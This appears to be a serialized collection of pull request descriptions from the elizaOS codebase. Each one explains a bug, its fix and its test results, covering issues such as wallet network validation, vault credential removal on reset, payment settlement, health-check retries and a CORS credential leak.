- Required-at-origin nulls are NOT stripped — they still fail admission visibly (no silent success fabricated). Nullable-at-origin nulls (`type: ["string","null"]`, `type: "null"`, anyOf/oneOf null branches) are preserved as real values.
- Restore is applied only to named properties declared at the transform path; record-entry values, array elements, and undeclared keys are untouched.

# Background

## What does this PR do?

Strict non-Cerebras native tool schemas require every property (`sanitizeJsonSchema`'s all-properties-required rule), so lenient OpenAI-compatible providers answer an origin-optional argument with `null`. The reverse mapping (`restoreRecordArgToolCalls`) removed the `__eliza_record_entries` carrier but kept those nulls, and `validateToolArgs` — which correctly re-checks the caller's original schema, where those properties are optional and not nullable — then rejected the entire tool call with errors like:

```
Argument 'operations[0].workThreadId' expected string, got null
Argument 'operations[0].sourceWorkThreadIds' expected array, got null
...
```

This PR records, per all-required schema node, the origin-optional property names whose provider null means "omitted" (`omitNullProperties` on `RecordArgTransform`), and drops exactly those nulls during restore. Admission then judges the restored arguments against the original schema as designed.

## What kind of change is this?

Bug fix (non-breaking change which fixes an issue).

## Why are we doing this? Any context or related work?

The failing test was introduced in `bcc773485b` (Sept 15) to pin the real provider behavior ("non-Cerebras strict tools also represent omitted optionals as null") and has been red on `develop` since introduction, contributing to the chronically failing **Develop Full** workflow. The modeled payload is not hypothetical: it is the observed live shape of strict OpenAI-compatible endpoints answering sparse multi-operation actions such as `WORK_THREAD`. Left unfixed, every such native tool call fails admission on the non-Cerebras path.

# Documentation changes needed?

My changes do not require a change to the project documentation.

8a:T1fa0,# Relates to

Extracted from the senior-care product's explicit patch overlay (eliza-research/senior-care, `patches/eliza/task-choice-accessibility.patch`), which it currently applies on top of `packages/ui/src/components/interactive-task/TaskChoice.tsx`. Upstreaming it lets that product drop the overlay.

Problem: `TaskChoice` renders unavailable options (in flight, host-pending, expired, already received) as `disabled` buttons. Disabled buttons are removed from the tab order, cannot be activated, and give no feedback, so screen-reader users and older users who tap them do not learn why nothing happens.

# Change

- New opt-in prop `explainUnavailable?: boolean` (default `false`).
  - Options stay focusable and activatable; while unavailable they carry `aria-disabled="true"` instead of `disabled`.
  - Activating an option while a choice is in flight (`pending` prop or the component's own busy state) shows a `role="status"` message from the new `TaskChoiceMessages.checking` key (default: "Your choice is being checked. Please wait for the result."). The notice clears when the in-flight state ends or the widget changes.
  - Activating an option after the deadline (even before the expiry timer fires) shows the existing `expiredMessage` status; only one status is rendered.
  - Options of a widget whose state is no longer `pending` are hidden; the existing received status remains.
  - The existing guards are unchanged, so `onChoose` is never called twice or late.
- Default behaviour for existing consumers is unchanged (disabled buttons, options still rendered for received widgets). This differs from the senior-care overlay, which hid received options unconditionally and broke the existing "never resubmits a committed choice" test; here hiding only applies in `explainUnavailable` mode. The overlay's hardcoded "being checked" string is now the localizable `messages.checking` key.
- Adds `TaskChoice.stories.tsx` (Pending, InFlightDisabled, InFlightExplained with a `play` assertion, ExpiredExplained, ReceivedExplained). The leaf stays unstyled; a story decorator stands in for host styles.
- README note for the new prop.

Risk: low. Opt-in, single leaf component. The only upstream users of `TaskChoice` are its own tests; README and package docs mention it.

8b:T1448,# Relates to

"Reset Agent" (`POST /api/agent/reset`) is meant to return the app to first run, but provider API keys survive it in the vault:

- The agent route (`packages/agent/src/api/agent-admin-routes.ts`) removes only `ELIZAOS_CLOUD_API_KEY`, `ELIZAOS_CLOUD_BASE_URL` and `ELIZAOS_CLOUD_ENABLED`. Its comment explains why: a leftover vault key re-hydrates the user on the next boot.
- The app's compat reset route (`packages/app/src/api/server.ts`) removes no vault rows at all.
- Provider keys live in the vault as `providers.<id>.api-key` (written by `/api/provider/switch` via `persistProviderApiKey`) and as `<ENV_KEY>` rows such as `ANTHROPIC_API_KEY` (written when `vault-bootstrap` migrates `config.env`).

After a reset, a new owner who goes through first run without a key and then picks that provider (the Settings "Use provider" button sends no key) gets the previous owner's credential: boot's `hydrateSelectedProviderCredentialFromVault` finds it and loads it into runtime settings without any prompt.

# Change

A new `removeResetCredentialsFromVault(vault)` in `runtime/operations/vault-bridge.ts` covers the three Cloud keys and, for every `FIRST_RUN_PROVIDER_CATALOG` entry, `providers.<id>.api-key` and its env key, plus z.ai's `providers.zai.api-key`, canonical `ZAI_API_KEY` and its `Z_AI_API_KEY` alias (z.ai has no catalog entry, so these come from `getFirstRunProviderSignalEnvKeys("zai")`). Each key is removed the way `DELETE /api/secrets/inventory/:key` removes it: the bare row, every `<KEY>.profile.<id>` row, and the `_meta.<KEY>` inventory record. Profiled credentials would otherwise be put back into `process.env` by `applyVaultProfilesForAgent` at boot. If removing a key fails, the helper keeps going and then throws a typed `VAULT_RESET_CREDENTIALS_FAILED` error naming the failed keys. Both reset routes call it, and both now return an error instead of claiming success; before this, the agent route only logged.

# Testing

New `packages/agent/test/agent-reset-provider-vault-keys.test.ts` drives the real reset route against a `createTestVault` vault. The vault holds an Anthropic key in all three forms: the provider-switch row, the bare env row, and an active `default` profile with inventory meta. After the reset it runs both real boot paths, `hydrateSelectedProviderCredentialFromVault` and `applyVaultProfilesForAgent`. A second case makes one removal throw and expects the reset to return 500.

- On develop: `expected true to be false` (`providers.anthropic.api-key` still present).
- With this change: both rows are gone and hydration returns `missing` with an empty overlay.
- `biome check` on the changed files is clean, and `tsc --noEmit` reports nothing for the changed agent files. App-package `tsc` shows only pre-existing resolution errors on lines this PR doesn't touch.

8c:T1488,# Relates to

iOS mobile bundles (`build-mobile-bundle.ts --target=ios|ios-jsc`) alias `react`/`react-dom` to the Proxy-backed CommonJS stubs in `packages/agent/scripts/mobile-stubs/`. Bun lowers `import * as React from "react"` with `__toESM`, which copies the module's **own property names** onto a fresh namespace object. Proxy `get`/`has` traps alone do not populate that namespace, so `React.useState`, `React.createElement`, named imports such as `useState`, and `ReactDOM.createPortal` all evaluated to `undefined` in the bundle (`TypeError: React.useState is not a function`).

Extracted from the senior-care product's explicit patch overlay (eliza-research/senior-care `patches/eliza/mobile-react.cjs.patch` and `mobile-react-dom.cjs.patch`), which applied this fix against the older `react.cjs`/`react-dom.cjs` stubs. Current `develop` renamed them to `.ts` and does not contain the fix. Note: on current `develop` the Android target resolves the real React runtime, so this affects the `ios` and `ios-jsc` targets that still use the stubs.

# Change

- `react.ts` / `react-dom.ts`: define every named React/ReactDOM export as an own, enumerable, configurable property of the proxy target. The `get` trap still supplies every value, so stub behavior is unchanged; only the namespace population is fixed.
- New e2e regression `test/mobile-react-stub-namespace.test.ts` (+ child fixture): a separate Bun process bundles a real entry using `import * as React`, a named `useState` import, `import * as ReactDOM` and `react-dom/client` against the shipped stubs with `Bun.build` (onResolve aliasing like `build-mobile-bundle.ts`) for both the `bun` (iOS) and `browser` (iOS JSContext) targets, runs each bundle, and asserts the named exports exist and behave (`useState("initial")` returns `"initial"`, `Fragment` is a symbol, etc.).

Risk: low. Stubs only ship in mobile iOS bundles; values come from the unchanged `get` trap.

# Testing

- `node scripts/run-vitest-batches.ts test/mobile-react-stub-namespace.test.ts` (packages/agent): **fails without the fix** (`TypeError: React.useState is not a function`), **passes with it** (1 file, 7.1s).
- `bun run typecheck` (packages/agent): passed.
- `bun run lint:check` (packages/agent): passed (0 errors; existing `noRedundantUseStrict` warnings in all mobile stubs are pre-existing and unchanged).
- `bun run build:ios-bun` and `bun run build:ios-jsc` (packages/agent): both completed; the emitted `agent-bundle.js` contains the export-name lists. Bundles were not executed on a device or simulator.

8d:T1cd6,## Problem

`buildWalletRpcUpdateRequest` in `packages/core/src/contracts/wallet.ts` resolved the update-request network with a two-way ternary:

```ts
selectedNetwork ?? (walletConfig?.walletNetwork === "testnet" ? "testnet" : "mainnet")
```

Any stored `walletConfig.walletNetwork` value that was not exactly `"testnet"` — including corrupt runtime values such as `"devnet"`, `"MAINNET"`, `"true"`, or `"1"` — silently became `"mainnet"` in the request sent to the server. That contradicts the honest-invalid contract established for the same concept in `resolveWalletNetworkMode` (`packages/agent/src/api/wallet-rpc.ts`, #33020), which throws `WALLET_NETWORK_INVALID` on invalid values, and the server-side update parser (`plugins/plugin-wallet/src/api/wallet-routes.ts`), which maps invalid incoming networks to `undefined` instead of trusting them. The wallet network controls real funds routing, so fabricating `mainnet` from corrupt status is the dangerous direction to fail in: a stored value that meant testnet (e.g. wrong case) would be persisted and routed as mainnet with no error.

Reproduced on `origin/develop` before the fix (`bun` executing production source): `undefined`/`mainnet`/`testnet` behaved correctly, while `"devnet"`, `"MAINNET"`, and `"true"` all returned `"mainnet"` with no error.

## Change

- Add `normalizeWalletUpdateNetwork` / `resolveWalletUpdateNetwork` in `packages/core/src/contracts/wallet.ts`, mirroring the `resolveWalletNetworkMode` semantics: missing/`null`/blank defaults to `mainnet`, `mainnet`/`testnet` (case-insensitive, trimmed) pass through canonically, anything else throws `ElizaError` with code `WALLET_NETWORK_INVALID` and `{ received, source }` context naming `selectedNetwork` or `walletConfig.walletNetwork`.
- Route `buildWalletRpcUpdateRequest` through the resolver. All previously valid behaviors are byte-identical; only genuinely invalid non-blank values change (throw instead of silent `mainnet`).
- Add `packages/core/src/contracts/wallet-network.test.ts`: supplemental regression guard (missing/blank default, valid passthrough, invalid stored throws, invalid explicit throws).

## Testing

- [x] Targets `develop` and has no conflicts with the latest `origin/develop` (rebased onto `43ed7d18c3`, PR head `76e200ce936eaadc38dec5d9cc381802ef025ded`).
- [ ] Ran `bun install` and `bun run verify` after syncing; record blockers below.
- [ ] Updated relevant documentation.

`bun install` / full `bun run verify` were not run: this worktree is a clean source checkout without installed dependencies (disk-constrained host; full install needs GBs). Focused verification instead, all on the rebased head:

8e:T1296,# Relates to

`DocumentService.addDocument` derives the document ID with `generateContentBasedId(content, agentId, { filename, contentType })`. Only chat-audience uploads add a namespace, so an upload's scope and owner don't affect the ID. When a ready document already exists at that ID, `addDocument` logs `already exists ... - skipping` and returns that document's ID and fragment count without checking that its scope matches the request. Reached via `POST /api/documents`, `/api/documents/url`, `/api/documents/bulk`, and the DOCUMENT action's non-chat paths:

- **Lost upload:** Bob privately uploads a file whose content and filename match Alice's private file. Bob gets `ok: true` with Alice's `documentId`, which he can't read, and nothing is stored for him. The response also tells him someone else already has that exact file.
- **Wrong visibility:** the owner uploads a file as `global` after a user stored the same file as `user-private`. The owner is told it succeeded, but the document stays private to that user and nobody else can retrieve it.

# Change

- Non-chat uploads with a non-global scope get a content-ID namespace of `<scope>:<owner>`. The scope and owner come from the same resolution `processDocument` uses, now a shared `resolveDocumentScopeOwner` helper. Global and chat IDs are unchanged, so global dedup works as before.
- When a ready document already sits at the ID but its scope or owner differs from the request, `addDocument` throws `DOCUMENT_SCOPE_CONFLICT` instead of returning someone else's document. This covers private documents stored before this change at the shared ID. Pending and failed snapshots keep their existing delete-and-reprocess handling.

# Testing

New `document-content-id-scope.pglite.test.ts` uses a real `AgentRuntime` (via `createTestRuntime`) with two USER-role entities:

- Bob's private upload of content identical to Alice's gets its own document, and Bob can read it.
- The owner's global upload of a file Alice holds privately is stored with `scope: "global"`.

On develop both fail (`expected 'a1a9b10b-…' not to be 'a1a9b10b-…'`; `expected 'user-private' to be 'global'`). With this change both pass, and `src/features/documents` passes 39 files and 439 tests on the pinned Node 24.15.0, including `service-orphan-compensation`. `tsc --noEmit` and `biome check` report nothing for the changed files.

8f:T1bbe,# Relates to

#32940 (stop default escalation after one-shot reminder delivery). Its follow-up commit fixed the blocking points of [this review](https://github.com/elizaOS/eliza/pull/32940#pullrequestreview-5358024764): owner replies are reviewed again and due reviews close. That same fix introduced a repeated model call on develop `811c3fac48`.

In `plugins/plugin-personal-assistant/src/lifeops/domains/reminders-service.ts`:

- For a delivered one-shot owner reminder, default escalation is suppressed (`suppressDefaultEscalation = true`, `:3949`). The delivery loop still calls `dispatchDueReminderEscalation` for that occurrence on every scheduler tick (`LIFEOPS_TASK_INTERVAL_MS = 60_000`).
- With no escalation attempt being dispatched, `previousAttempt` stays the delivered plan attempt, so its review time stays in the past and `reviewOwnerResponseAfterReminderAttempt` runs on **every tick**.
- That review reads every owner message after delivery (`:1433`). Each one that is not an exact reply ("done", "30 minutes", …) goes to `classifyReminderOwnerResponseSemantically`, a `TEXT_SMALL` model call.
- An "unrelated" verdict persists nothing, so the next tick classifies the same messages again. This continues until the occurrence leaves its visibility window, by default due + 6 h (`engine.ts:150`).

**Measured on develop:** one ordinary owner chat message after delivery produced **35** classifier calls over 39 one-minute ticks. Ten such messages across the default window would be thousands of calls per reminder.

# Change

`reviewOwnerResponseAfterReminderAttempt` keeps the model's verdict for each reply:

- **Key:** attempt id, reply time, room, standalone-resolution flag and text.
- **Scope:** for the life of the service, bounded to 2000 entries, oldest evicted first.
- **Effect:** an unchanged reply is not sent to the model again; the stored verdict is reused.
- **What is cached:** only model verdicts (`semantic`, `semantic_abstain`). Deterministic verdicts cost nothing and are not stored. A missing verdict (model error, or no model) is not stored, so it is retried on the next tick.
- **What is unchanged:** new replies are still classified, so a later "snooze 20" or "done" is handled exactly as before. Review decisions, transitions and persisted metadata are unchanged, because the same verdict is returned.

A persisted per-attempt watermark would also work. I chose the in-memory verdict cache because it cannot change which decision a review reaches; at most one re-classification per reply happens after a process restart.

91:T13c6,# Relates to

An OxaPay crypto top-up can be paid but never credited. OxaPay decides whether the payer sent funds inside its 30-minute invoice lifetime, but network confirmations often finish after it, so the invoice reaches `paid` after our local `expires_at`. Then:

1. The paid webhook reaches `confirmPayment`, which throws `Payment has expired`, and `POST /api/crypto/webhook` returns 500.
2. Within 10 minutes `cleanup-expired-crypto-payments` marks the row `expired`.
3. OxaPay's retry hits the `status !== "pending" && !== "confirmed"` guard in `handleWebhook`, is acknowledged as `Payment already processed`, and OxaPay stops retrying.

Status polling (`checkAndConfirmPayment`) and manual confirmation (`verifyAndConfirmByTxHash`) also return early on `expired`, so nothing can recover the payment. The customer is charged and receives no credits.

# Change

The provider's confirmed `paid` status, already re-fetched from the OxaPay inquiry API and matched against the stored quote, is now authoritative over the local clock:

- `confirmPayment` no longer refuses settlement because `expires_at` has passed.
- `handleWebhook` lets a locally `expired` row through only when the webhook reports paid. That status is still verified against the API before anything is credited.
- Status polling and manual tx-hash confirmation query OxaPay for `expired` rows instead of returning early. `failed` rows still return early.

Unchanged: quote and track-ID matching, transaction-hash collision checks, row locking, and idempotent credit keys. This mirrors the direct-wallet path, which already settles late on-chain payments with `allowExpired` in `direct-wallet-payments.ts`.

# Testing

`packages/cloud/api/__tests__/crypto-late-paid-settlement.pglite.test.ts` runs the real settlement service on PGlite tables generated from the Drizzle schemas. Only `oxaPayService.getPaymentStatus` is stubbed, to return a paid invoice. It covers a paid webhook after expiry, a paid webhook after the cleanup cron expired the row, and status polling of an expired row.

- Before this change: `0 pass, 3 fail`. Errors: `Payment has expired`; `{"success":true,"message":"Payment already processed"}`; `confirmed: false`. In all three the organization balance stays 0.
- After: `3 pass, 0 fail`. The balance is 50 and the row is `confirmed`.
- 30 crypto and billing test files in `packages/cloud/{api,shared}` were run one file at a time, including `crypto-retired-miniapp`, `crypto-payment-amount-codes`, `crypto-payment-refunds` and `billing-manager-mutations`. All pass. The postgres-only integration suites report 0 tests locally because there is no Postgres here.
- `tsc --noEmit` reports no errors in the changed files for `packages/cloud/shared` and `packages/cloud/api`, and `biome check` on the changed files is clean.

95:T11b5,# Relates to

In `POST /api/v1/chat` (`packages/cloud/api/v1/chat/route.ts`), the `streamText` `onFinish` callback calls `assertModelOutputComplete(...)` before its settlement block. That throws `MODEL_OUTPUT_INCOMPLETE` when the finish reason is `length`, `content_filter` or `error`. The AI SDK runs `onFinish` through `notify()`, which catches and discards callback errors. So when a model stops on its output limit or a content filter:

- the text has already streamed and the response closes as a normal 200;
- `billUsage`, `settleReservation` / `settleUnknownReservation`, the anonymous message-slot commit, the conversation writes and the usage and generation records never run;
- the stream backstop doesn't fire either, because the stream closed normally.

The admission lease then waits for `MAX_LEASE_AGE_MS` (20 minutes) and `recoverExpiredInferenceAdmissionLease` charges the admitted estimate, which is the input estimate plus 500 default output tokens, instead of the provider-reported usage. The org is undercharged for long outputs, the hold sits on its balance for 20 minutes, and the turn is missing from the dashboard chat history. `/v1/chat/completions` and `/v1/messages` don't have this assertion and settle these finish reasons normally.

# Change

`onFinish` runs the existing settlement and persistence first and then calls the same `assertModelOutputComplete`, so incomplete output is still raised as before but can no longer skip billing.

# Testing

New `packages/cloud/api/__tests__/chat-incomplete-finish-settlement.test.ts` drives the real route and the real `streamText` with `MockLanguageModelV3`. Admission, billing and persistence are spies. - With this change, all three settle once at the reported cost with 2 conversation writes: `3 pass, 0 fail`.

96:T15ee,Fixes #33109

# Relates to

`normalizeRepositoryInput` (`plugins/plugin-agent-orchestrator/src/services/repo-input.ts`) keeps only the first two path segments for every known host, so a GitLab subgroup project is rewritten to its parent group:

```
develop https://gitlab.com/gitlab-org/charts/gitlab -> https://gitlab.com/gitlab-org/charts.git
develop https://gitlab.com/gitlab-org/charts/gitlab/-/merge_requests/1 -> https://gitlab.com/gitlab-org/charts.git
```

GitLab does not allow a project and a subgroup with the same path in one namespace, so the rewritten URL never names a repository:

```
$ git ls-remote --heads https://gitlab.com/gitlab-org/charts.git
fatal: could not read Username for 'https://gitlab.com': terminal prompts disabled
$ git ls-remote --heads https://gitlab.com/gitlab-org/charts/gitlab.git
cd23a05837ed7ae7977eedd09de8359477654e87	refs/heads/0-2-stable
…
```

Production callers: the TASKS create path (`actions/tasks.ts`, which also extracts the repo from message text with a two-segment regex) and `workspace-service.ts` (`assertSafeGitRemote(normalizeRepositoryInput(options.repo))` before cloning). `gitlab.com` is one of the three hosts these paths accept, so every coding task for a GitLab subgroup project fails to clone.

# Change

- GitLab project paths run up to the `-` separator that prefixes project pages (`/-/merge_requests/12`, `/-/tree/main`), or, in legacy links without it, a project page route: GitLab's reserved project wildcard routes (`tree`, `blob`, `raw`, `commits`, …, which can never be project or group names) plus the pre-`/-/` page routes GitLab still redirects (`issues`, `merge_requests`, `pipelines`, …), so pasted legacy links like `group/project/issues/3` still resolve to the project. The trade-off is that a subgroup literally named one of those legacy route words would be read as a page route; this is documented at the set.
- GitHub and Bitbucket keep `owner/repo`, so their deep links reduce exactly as before. The scheme-less `host/path` form shares the same logic (previously a scheme-less deep link such as `github.com/o/r/pull/1` fell through unnormalized).
- The TASKS text extractor moves to `extractRepositoryUrlFromText` in `repo-input.ts`: it accepts deeper paths (trimming is left to the normalizer) and drops trailing sentence periods, which `[\w.-]` would otherwise absorb into the last segment (`…/project.` → `project..git`).
- SSH/scp-style remotes are still preserved verbatim; `assertSafeGitRemote` is unchanged and accepts every new output (asserted in the tests).

Fixes #33073

## Summary

`POST /api/v1/eliza/google/disconnect` folds a malformed non-empty JSON body into an empty object via `request.json().catch(() => ({}))`, then applies its defaults (`side: "owner"`, `connectionId: null`) — and the connector then **revokes that side's current managed Google connection** (preferred active, else the first listed; `agent-google-connector/shared.ts`). A truncated request body silently becomes a successful default-side disconnect.

Two changes close the silent-revoke class on this route:

1. **Malformed non-empty JSON → 400 before the connector is called.** Absent/empty/whitespace-only bodies still parse as `{}` and keep the documented disconnect-on-side contract; syntactically valid but schema-invalid JSON keeps the existing 400 with zod issue details.
2. **`requestSchema` is now `.strict()`.** zod's default key-stripping meant `{"connection_id": "<uuid>"}` fell through as `{}` — revoking a connection the caller only misspelled. Unrecognized keys are now `400 unrecognized_keys` (same-tree precedent: `plaid/item-status/route.ts`, `plaid/exchange/route.ts`).

# Risks

Valid `accepted:true` JSON responses are byte-identical to before; missing/false/non-JSON 2xx responses change from fabricated `accepted:true` success to an honest 502 via the existing J1 boundary handler (same outcome the GitHub sink already produces for unexpected shapes). No auth, rate-limit, schema, or GitHub-sink behavior changes.

# Background

## What does this PR do?

`POST /api/bug-report` with `ELIZA_BUG_REPORT_API_URL` set treated any 2xx from the remote intake as success: a JSON body without the `accepted` flag fell back to `accepted:true` (`data.accepted ?? true`), and a non-JSON 2xx returned `accepted:true` outright. The client therefore showed success for reports the intake never confirmed. The GitHub sink in the same file strictly validates its response shape and answers 502 otherwise; the remote sink now matches it by throwing on a missing/false flag or a non-JSON body, which the existing J1 boundary handler translates to 502.

## What kind of change is this?

Bug fixes (non-breaking change which fixes an issue)

# Documentation changes needed?

My changes do not require a change to the project documentation.

9a:T1158,# Relates to

The every-minute health-check cron (`/api/v1/cron/health-check`) calls `monitorAllContainers({ unhealthyThreshold: 3, retryOnFailure: true, ... })`, but `monitorAllContainers` only reads `timeout`:

- **One failure is terminal.** A single non-2xx response from `/health`, such as a 503 during a restart or a GC pause, moves a `running` container to `failed`. The sweep only selects `status = 'running'`, so the "restore to running" branch in `updateContainerHealth` never runs from the cron, and the container stays `failed`. It keeps running in Docker, but billing stops (container billing only bills `running`/`deleting`), it drops out of the admin ingress map so the site goes dark, and its node slot and host port are treated as free.
- **A thrown probe aborts the whole sweep.** `checkContainerHealth` doesn't catch `fetch` errors (connection refused, DNS failure, timeout abort). One unreachable container rejects the `Promise.all`, the cron returns 500, and no container in that sweep gets updated, including the unreachable one.

# Change

- `checkContainerHealth` returns an unhealthy result with the error message when `fetch` throws, and always clears its timeout.
- `monitorAllContainers` re-probes a failing container up to `unhealthyThreshold` times when `retryOnFailure` is set, and marks it `failed` only if every probe fails. Each result now carries its container ID (previously `""`).

# Testing

New `packages/cloud/shared/src/lib/services/health-monitor.pglite.test.ts` runs the real sweep and `updateContainerHealth` against a PGlite `containers` table with `fetch` stubbed, using the cron's config:

- a 503 followed by a 200 keeps the container `running` (2 probes);
- three 503s mark it `failed` (3 probes);
- one container whose `fetch` throws while another is healthy completes the sweep, marks the first `failed` and keeps the second `running`.

On develop: `0 pass, 3 fail`. With this change: `3 pass, 0 fail`. `biome check` on the changed files is clean, and `tsc --noEmit` in `packages/cloud/shared` reports nothing for them.

9b:T1cf0,# Relates to

#33002 (durable approved workflows and device actions with managed Cloud) added hosted digests, but none of their routes can be reached through the agent's HTTP dispatcher. This was the blocking point of [this review](https://github.com/elizaOS/eliza/pull/33002#pullrequestreview-5383662522), and it is unchanged on develop `811c3fac48`:

- `plugins/plugin-workflow/src/routes/workflow-routes.ts:147-205` serves nine method/path pairs under `/api/workflow/hosted/` (live calendars and accounts, sources, source revoke, loops, results and ack).
- `GET /api/workflow/status` advertises them with `hostedDigestProtocol: 1` (`:237`).
- `plugins/plugin-workflow/src/plugin-routes.ts` is the plugin's only route table, and it has no `hosted` entry. Plugin routes only reach a handler through a registered pattern (`packages/agent/src/api/plugin-route-path.ts`, used by every dispatcher: `runtime-plugin-routes.ts`, `dispatch-route.ts`, `hono-mount.ts`, `server-lazy-routes.ts`).

**Result:** every hosted digest request answers 404 even though `/status` tells clients the protocol is available. `hosted-digests-http.test.ts` and `hosted-live-google-http.test.ts` call `handleWorkflowRoutes` from a bare `http.createServer`, which bypasses the route table, so they never saw this.

# Change

- The nine pairs are registered in `plugin-routes.ts` against the existing `workflowHandler`, as `rawPath` routes like the rest of the table. They are not `public`, so they go through the same auth gate as the other workflow routes, and the handler's owner scoping is unchanged.
- **Body caps are kept:**
  - The dispatcher parses JSON bodies (default 1 MiB) before the handler runs, and `readBody` then returns that pre-parsed body, so the handler's own `readBody` limits would no longer apply.
  - `POST …/hosted/live-calendars` and `POST …/hosted/sources` therefore restate their 2000- and 20000-byte caps as `maxBodyBytes`.
  - The other hosted POSTs (`sources/revoke`, `loops`, `results/ack`) keep the dispatcher's 1 MiB default. That is already stricter than their handler limit (`MAX_WORKFLOW_JSON_BYTES`, 2 MB), and restating 2 MB would loosen them. The route comment says so, and a test pins it.

`/api/workflow/hosted/cloud-delegation/` stays app-managed (`route-auth-policy.ts`) and is not touched.

9c:T108c,# Relates to

App.tsx always publishes a surface-realm view scope. While a scope is active, the raw-global guard in `surface-realm-broker.ts` throws on any write to a shell-reserved key (`eliza.*`, `elizaos.*`, …) unless the caller is inside `runAsPrivilegedShell`. Two shell writers still call `window.localStorage` directly and swallow that throw:

- `useDesktopTabs` writes `elizaos.desktop.pinned-tabs`. On Electrobun desktop, pinning a tab only updates in-memory state, so pinned tabs disappear on every restart.
- `SubscriptionStatus.rememberOAuthActive` writes `eliza.settings.anthropic.oauth-active`, and the `?setup=oauth` `replaceState` in the same `try` never runs either. After "Login with Anthropic" hands off to the browser and settings remounts, the paste-code form is gone, so the user can't enter the authorization code they were just given.

# Change

Both writes go through the existing privileged channel. `useDesktopTabs` uses `shellLocalStorage.setItem`, the one-token migration used by #17826, #16681 and #16426. `rememberOAuthActive` runs its storage write and URL marker inside `runAsPrivilegedShell`, as `first-run-reset.ts` does. Nothing else changes.

# Relates to

`packages/agent/src/api/wallet-rpc.ts` — `resolveWalletNetworkMode(config?, fallback?)` returned `"mainnet"` for **any** value other than exactly `"testnet"`, including `""`, typos (`"MAINET"`, `"devnet"`), and garbage. Callers (`resolveWalletRpcReadiness`, `resolveBscRpcUrls`, `resolveSolanaRpcUrls`) use the result to pick BSC/Solana RPC URLs and readiness. A one-character typo in `config.wallet.network` / `ELIZA_WALLET_NETWORK` silently routes wallet execution to mainnet — a real-money risk. Adjacent to merged #33018 (honest unavailable registry config) but not covered by it (different file, different function).

# Change

- `resolveWalletNetworkMode` now throws a typed `ElizaError` (`code: WALLET_NETWORK_INVALID`) for any invalid **explicit** value (non-empty after trim, not `mainnet`/`testnet`) from `config.wallet.network`, `fallback`, or `ELIZA_WALLET_NETWORK`. The message and `context` name the received value and its source (`fallback` | `config.wallet.network` | `ELIZA_WALLET_NETWORK`), with an actionable expected-values hint.
- Preserved behavior: unset/blank across all three sources still defaults to `"mainnet"` (now documented as an explicit default in a code comment); `"mainnet"`/`"testnet"` match case-insensitively after trimming.
- Return type stays `"mainnet" | "testnet"` (not widened to `null` — callers expect it; throwing is the honest signal per repo error policy: inner paths throw typed errors, boundaries translate).
- `_resolveWalletNetwork` (same file) left untouched: it is dead code (zero callers repo-wide) and only *infers* from `BSC_TESTNET_RPC_URL` presence rather than reading an explicit network value — out of scope by design.
- Scope: `wallet-rpc.ts` + one focused test file only. No `any`, no fabricated success, existing file header kept.
- Material risk: any deployment that currently relies on the silent typo-to-mainnet mapping (i.e. has a misspelled network value in config/env) will now fail fast with `WALLET_NETWORK_INVALID` instead of silently using mainnet. That is the intended honest behavior; routes/surfaces already translate `ElizaError` at their boundaries.

9e:T1465,# Relates to

On mobile, the agent server (`packages/agent/src/api/server.ts`) dispatches `/api/local-inference*` to `handleLocalInferenceRoutes`, and the `LOCAL_INFERENCE` action calls `applyLocalInferenceManagementMutation`. Both use local copies of verify and uninstall in `local-inference-routes.ts` that have drifted from the local-inference service:

- **Verify** (`POST /api/local-inference/installed/:id/verify` and `verify_model`) returned `state: currentSha256 === installed.sha256 ? "ok" : "unknown"`. A model whose bytes no longer match the recorded hash came back as `"unknown"`, and the GGUF structure check was skipped, so a truncated file was `"unknown"` too. `LocalInferencePanel` renders `"unknown"` as a green "Baseline hash recorded" notice. The user is told a corrupt model is fine, and no baseline is actually recorded. The canonical `verifyInstalledModel` returns `"mismatch"` / `"truncated"`.
- **Uninstall** (`DELETE /api/local-inference/installed/:id`, `uninstall_model`, and the chat "redownload" intent) ran `fsp.rm(target.path)` on the text GGUF only and dropped the registry row. It reported `{removed: true}` but left the rest of an Eliza-1 bundle (`tts/`, `asr/`, `vision/`, manifest; about 2.5 GB for 2B and 3.5 GB for 4B) orphaned on the device, with nothing to clean it up later. It also never unloaded the active model. The service's `removeElizaModel` removes the bundle root, and `uninstall` unloads first.

# Change

Both paths delegate to the service: verify calls `verifyModel(id)`, which also pins a baseline for legacy rows, and uninstall calls `uninstall(id)`. Uninstall still runs inside the route's `registry.json` file lock, so concurrent uninstalls stay serialized (#25123). The now-unused `hashFile`/`writeRegistry` copies are removed, and `verify_model`'s result type reuses the shared `VerifyResult`. The desktop compat routes already use the service and are unchanged.

# Testing

New `src/local-inference-routes.verify-uninstall.test.ts` drives the real `applyLocalInferenceManagementMutation` on a temp `ELIZA_STATE_DIR`:

- A model registered with the original bytes' sha256, then corrupted on disk, must verify as `mismatch`.
- Uninstalling an Eliza-1 bundle must remove the bundle directory and the registry row.

Both fail on develop (`state: "unknown"`; `bundle dir exists: true`) and pass with this change. The existing `local-inference-routes.concurrency.test.ts` (including concurrent uninstalls) still passes: 7/7 across the two files. `tsc --noEmit` and `biome check` report nothing for the changed files.

Operator-requested iteration: next useful wallet hardening after #33020 (agent
`resolveWalletNetworkMode` honest-invalid) and #33027 (core
`buildWalletRpcUpdateRequest` honest-invalid, open). Those left the HTTP
boundary permissive: `resolveWalletConfigUpdateRequest` in
`plugins/plugin-wallet/src/api/wallet-routes.ts` mapped any non-exact
`walletNetwork` value to `undefined` and returned HTTP 200, silently dropping
typos such as `"devnet"` / `"mainent"` instead of rejecting them. Downstream
the request then preserved the stored network (or defaulted toward mainnet),
so a client typo never surfaced as an error on a funds-routing control.

# Change

- Add `parseWalletNetworkField` in `plugins/plugin-wallet/src/api/wallet-routes.ts`:
  absent/`null`/blank stays `undefined` (no-change), `mainnet`/`testnet`
  accepted case-insensitively with trimming to canonical lowercase, anything
  else is invalid.
- Both `resolveWalletConfigUpdateRequest` branches (selections object and
  compat credentials) now return `null` on invalid, so
  `PUT /api/wallet/config` responds `400 Invalid wallet config update` and
  never calls `applyWalletRpcConfigUpdate` for that request.
- Previously valid behaviors are unchanged; previously silently-ignored
  values (`" TestNet "`, `"MAINNET"`) now normalize instead of being dropped,
  and genuinely invalid values (`"devnet"`, `"mainent"`, non-strings) are
  rejected.
- Add `plugins/plugin-wallet/src/api/wallet-config-network.test.ts` covering
  valid/absent/blank acceptance, case-insensitive normalization, and 400
  rejection on both request shapes.

a1:T1aba,# Relates to

Fixes https://github.com/elizaOS/eliza/issues/33034 — the desktop renderer
static server answered every static response with
`Access-Control-Allow-Origin: *`, so any website could cross-origin fetch the
token-bearing index HTML and extract the OWNER-level agent API credential.

